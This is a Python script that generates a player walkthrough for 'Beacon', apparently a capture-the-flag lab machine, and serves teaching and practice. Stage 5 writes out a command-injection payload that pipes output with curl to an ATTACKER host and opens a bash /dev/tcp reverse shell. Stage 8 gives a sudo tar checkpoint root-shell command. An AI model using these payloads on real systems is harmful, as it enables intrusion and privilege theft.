#!/usr/bin/env python3
"""
Build the player-facing walkthrough for the Beacon machine.

Clones the MaryLab house template (template.docx) via wt_builder.Walkthrough,
clears its body and rebuilds it with Beacon-specific content. Flag values are
redacted and no secret credentials are printed (placeholders only), per the
MaryLab player-walkthrough rules.

    python3 build_walkthrough.py
    -> Beacon_Player_Walkthrough.docx
"""
import os
from wt_builder import Walkthrough

HERE = os.path.dirname(os.path.abspath(__file__))
TEMPLATE = os.path.join(HERE, "template.docx")
OUT = os.path.join(HERE, "Beacon_Player_Walkthrough.docx")

REDACTED = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # 32 hex, redacted

w = Walkthrough(TEMPLATE)

# ---- title block ----------------------------------------------------------
w.title("Beacon")
w.subtitle("Player Walkthrough")
w.tagline("Lumen Systems · Beacon uptime portal · Linux · Medium · by MaryLab")
w.body(
    "The chain: recon the marketing site → enumerate the RepoForge code host and "
    "identify the real project repo → recover credentials leaked in old git history "
    "→ sign in to the internal Ops Console → blind command injection in the "
    "connectivity probe for a reverse shell → neutralise a 60-second self-wiping "
    "maintenance job → read the operational database for the next user → escalate "
    "to root through a sudo misconfiguration.")

w.callout("SCOPE",
          "Authorised MaryLab event content. Add the lab hostnames beacon.myl and "
          "git.beacon.myl to your hosts file, pointing at the target address, before you start.")

w.profile([
    ("Machine", "Beacon"),
    ("Difficulty", "Medium"),
    ("Operating system", "Linux (Ubuntu 22.04)"),
    ("Author", "MaryLab"),
    ("User flag", "/home/maya/user.txt  (32 hex — redacted here)"),
    ("Root flag", "/root/root.txt  (32 hex — redacted here)"),
    ("Key skills", "web recon, git-history secret recovery, blind OOB command "
                   "injection, host enumeration, database triage, GTFOBins sudo escalation"),
])

# ===========================================================================
w.eyebrow("STAGE 1 — RECON", first=True)
w.h1("Mapping the attack surface")
w.lead("Observation.", " A port scan exposes only SSH and an HTTP service. Everything "
       "else is behind the website.")
w.code("nmap -sC -sV -p- --min-rate 2000 TARGET",
       "22/tcp open  ssh      OpenSSH",
       "80/tcp open  http     nginx")
w.lead("Reasoning.", " Two lab hostnames are advertised by the site. Map both to the "
       "target and read every public page — the footer and the “About” / "
       "“Changelog” pages tend to leak where the code actually lives.")
w.code("echo \"TARGET  beacon.myl git.beacon.myl\" | sudo tee -a /etc/hosts",
       "curl -s http://beacon.myl/ | html2text | less")
w.lead("Result.", " The marketing site for the open-source Beacon uptime monitor. The "
       "footer and the About/Changelog pages state the project is open source, has been "
       "developed “in the open since June 2020”, and is hosted on a self-hosted "
       "RepoForge instance at git.beacon.myl/lumen-systems/beacon.")
w.lead("Next step.", " Open RepoForge and find the project's real repository.")

# ===========================================================================
w.eyebrow("STAGE 2 — REPOSITORY ENUMERATION")
w.h1("Identifying the project repository")
w.lead("Observation.", " RepoForge lists about twenty repositories — docs, charts, "
       "forks, experiments and scratch repos. Picking the right one by guessing is not "
       "the intended path.")
w.code("# browse the listing", "xdg-open http://git.beacon.myl/explore")
w.lead("Reasoning.", " Two independent clues corroborate the real project. First, the "
       "marketing site names it explicitly: lumen-systems/beacon. Second, the project "
       "says it launched in June 2020 — so the real repo's earliest commits should "
       "date to June 2020. Beware two traps: an archived 2018 prototype "
       "(lumen-systems/beacon-legacy) predates the project, and a personal fork "
       "(daniel/beacon) only has recent branch work. The owner and the first-commit date "
       "disambiguate them.")
w.lead("Action.", " Confirm the earliest commit date on the candidate repo.")
w.code("git clone http://git.beacon.myl/lumen-systems/beacon.git",
       "cd beacon",
       "git log --reverse --format='%ai  %an  %s' | head -1",
       "# 2020-06-15 ...  Priya Raman  Initial commit: project skeleton and licence")
w.lead("Result.", " lumen-systems/beacon is the project: named by the site and first "
       "committed in June 2020.")
w.lead("Next step.", " Audit its history for anything that should never have been "
       "committed.")

# ===========================================================================
w.eyebrow("STAGE 3 — GIT HISTORY LEAK")
w.h1("Recovering leaked credentials from old commits")
w.lead("Observation.", " The current tree looks clean, but secrets are often added and "
       "later “removed” in a follow-up commit — which only hides them from "
       "HEAD, not from history.")
w.lead("Action.", " Scan the full history, by hand and with a secret scanner.")
w.code("gitleaks detect --source . --no-banner        # or: trufflehog git file://.",
       "git log --oneline --all",
       "git log -p -- config/dev.env                   # follow the add/remove")
w.lead("Result.", " An early June-2020 commit (“Add local dev config for the ops "
       "console”) introduced config/dev.env; a later commit (“Move ops console "
       "creds to env vars; drop committed dev config”) deleted it. The file is gone "
       "from HEAD but fully recoverable from history.")
w.code("git show <leak_commit>:config/dev.env",
       "# BEACON_OPS_URL=http://beacon.myl/ops",
       "# BEACON_OPS_USER=devops",
       "# BEACON_OPS_PASSWORD=<redacted — recovered from history>",
       "# BEACON_API_TOKEN=<redacted>")
w.lead("Next step.", " Use the recovered operator credentials against the Ops Console.")

# ===========================================================================
w.eyebrow("STAGE 4 — DEV PANEL ACCESS")
w.h1("Signing in to the Beacon Ops Console")
w.lead("Observation.", " The leaked dev.env points at an internal console at "
       "http://beacon.myl/ops — “Authorised operators only”.")
w.lead("Action.", " Authenticate with the recovered devops credentials.")
w.code("# browser: http://beacon.myl/ops",
       "#   Operator: devops",
       "#   Password: <recovered ops password>")
w.lead("Result.", " The Ops Console opens on an operations overview with a monitored-"
       "endpoints table and an on-call diagnostics tool.")
w.lead("Next step.", " Examine the diagnostics tool — it runs something server-side.")

# ===========================================================================
w.eyebrow("STAGE 5 — BLIND COMMAND INJECTION")
w.h1("Out-of-band RCE in the connectivity probe")
w.lead("Observation.", " /ops/diagnostics submits a host to “probe”. The console "
       "confirms the probe was queued but never shows any output — the result is "
       "written to an agent log, not the screen. This is a blind feature.")
w.lead("Reasoning.", " A reachability probe almost certainly shells out to ping/host "
       "with the target concatenated into the command line. Because nothing is echoed "
       "back, confirm execution out of band rather than expecting output — start a "
       "listener and have the server call home.")
w.lead("Action.", " First prove execution, then upgrade to a reverse shell.")
w.code("# prove blind RCE out-of-band (attacker listener on UDP/53 or a webhook):",
       "target = x; id | curl -s --data-binary @- http://ATTACKER:8000/",
       "",
       "# then catch a shell:",
       "#   attacker:  nc -lvnp 4444",
       "target = x; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'")
w.lead("Result.", " A reverse shell as the service account beacon-ops. It cannot read "
       "the user flag or maya's home.")
w.lead("Next step.", " Expect the shell to die — work out why, fast.")

# ===========================================================================
w.eyebrow("STAGE 6 — THE 60-SECOND RESET")
w.h1("Neutralising the self-wiping maintenance job")
w.lead("Observation.", " The reverse shell is killed roughly once a minute, and files "
       "dropped in /tmp disappear. Something is resetting the sandbox on a timer.")
w.lead("Reasoning.", " Do not try to out-race a per-minute job. Use the window you have "
       "to enumerate what it is and disable it. Because the job runs as your own account "
       "(beacon-ops), you are allowed to turn it off.")
w.lead("Action.", " In a fresh shell, enumerate scheduled work immediately.")
w.code("crontab -l                      # beacon-ops' own crontab",
       "cat /var/log/beacon/reset.log   # heartbeat every minute",
       "ps aux | grep -i reset",
       "cat /opt/beacon/maintenance/reset_sandbox.sh")
w.lead("Result.", " A beacon-ops cron entry runs /opt/beacon/maintenance/reset_sandbox.sh "
       "every minute; the script kills stray shells and wipes dropped files.")
w.lead("Action.", " Disable it — any one of these is enough.")
w.code("crontab -r                                     # drop the schedule, or",
       "crontab -e     # comment out the reset line, or",
       "chmod -x /opt/beacon/maintenance/reset_sandbox.sh")
w.lead("Result.", " The reset stops; your shell is now stable.")
w.lead("Next step.", " Enumerate for persistent state — the database survives the "
       "reset.")

# ===========================================================================
w.eyebrow("STAGE 7 — DATABASE → USER")
w.h1("Reading the operational database for the next account")
w.lead("Observation.", " The site app runs as beacon-ops and keeps its runtime config on "
       "disk. The database was never touched by the resetter.")
w.lead("Action.", " Read the app config for the database credentials, then connect.")
w.code("cat /etc/beacon/beacon.env",
       "#   DATABASE_URL=postgresql://beacon_ops:<db_password>@127.0.0.1:5432/beacon",
       "PGPASSWORD='<db_password>' psql -h 127.0.0.1 -U beacon_ops -d beacon")
w.lead("Reasoning.", " The control plane stores the credentials it must present to "
       "outbound integrations — including the release-deploy SSH account — in a "
       "plaintext table so the “Deploy” button can drive them unattended.")
w.lead("Action.", " Read the stored integration credentials.")
w.code("\\dn    -- schemas: app, ops",
       "SELECT service, username, secret, note",
       "  FROM ops.integration_credentials;",
       "-- ssh-deploy | maya | <maya_password> | Release-deploy automation account ...")
w.lead("Result.", " The ssh-deploy row is maya's account, and that password is also her "
       "Linux password.")
w.lead("Action.", " Become maya and read the user flag.")
w.code("ssh maya@TARGET          # or: su maya      (password: <maya_password>)",
       "id                       # uid=1100(maya)",
       "cat /home/maya/user.txt  # user flag: " + REDACTED + "  (redacted)")
w.lead("Next step.", " Enumerate maya's privileges for the final escalation.")

# ===========================================================================
w.eyebrow("STAGE 8 — PRIVILEGE ESCALATION")
w.h1("Root via a sudo-permitted tar (GTFOBins)")
w.lead("Observation.", " maya may run one command as root without a password.")
w.code("sudo -l",
       "#  (root) NOPASSWD: /usr/bin/tar")
w.lead("Reasoning.", " tar can execute an arbitrary command through its checkpoint "
       "action — a documented GTFOBins technique. Run as root, that is a root shell.")
w.lead("Action.", " Trigger the checkpoint action.")
w.code("sudo tar -cf /dev/null /dev/null --checkpoint=1 \\",
       "     --checkpoint-action=exec=/bin/sh",
       "# id -> uid=0(root)",
       "cat /root/root.txt   # root flag: " + REDACTED + "  (redacted)")
w.lead("Result.", " Code execution as root and the root flag. The box is owned.")
w.lead("Next step.", " Submit both flags.")

# ===========================================================================
w.eyebrow("SUMMARY")
w.h1("The chain at a glance")
w.numbered([
    "Recon the marketing site; note it is open source, started June 2020, hosted on "
    "RepoForge at git.beacon.myl/lumen-systems/beacon.",
    "Identify the real repo among ~20 by the site reference plus its June-2020 earliest "
    "commit; ignore the 2018 prototype and the personal fork.",
    "Recover ops-console credentials leaked in git history (added, then “removed”).",
    "Sign in to the internal Ops Console with the leaked devops credentials.",
    "Exploit blind command injection in the connectivity probe for an out-of-band reverse "
    "shell as beacon-ops.",
    "Enumerate and disable the 60-second reset_sandbox cron (owned by beacon-ops) instead "
    "of racing it.",
    "Read the app config and the persistent database; recover maya's reused password from "
    "ops.integration_credentials; become maya and read the user flag.",
    "Abuse sudo NOPASSWD tar via its checkpoint action (GTFOBins) to get root and read the "
    "root flag.",
])

w.save(OUT)
print("wrote", OUT)
